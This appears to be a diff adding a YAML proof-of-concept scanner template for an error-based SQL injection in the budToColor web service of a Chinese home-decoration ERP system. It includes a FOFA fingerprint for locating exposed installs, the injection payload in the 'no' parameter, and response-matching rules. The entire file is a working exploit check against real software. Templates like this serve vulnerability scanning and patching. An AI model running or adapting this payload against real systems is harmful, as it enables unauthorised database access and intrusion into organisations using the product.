@@ -1,0 +1,20 @@
+id: poc-yaml-znfit-erp-ms-budtocolor-sqli
+info:
+  name: 家装ERP管理系统 budToColor SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 家装ERP管理系统
+  fofa: body="上海装盟信息科技有限公司"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /main/login.aspx
+  expression: status_code == 200 && contains(body,"上海装盟信息科技有限公司")
+- method: GET
+  path: /WEB_SERVICE/Budget.asmx/budToColor?no=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))&color=string
+  expression: status_code == 500 && contains(body,"0x" + t2) && matches(body,"转换成数据类型(.*?)时失败")
+    && matches(body,"在将(.*?)值")
+transport: http
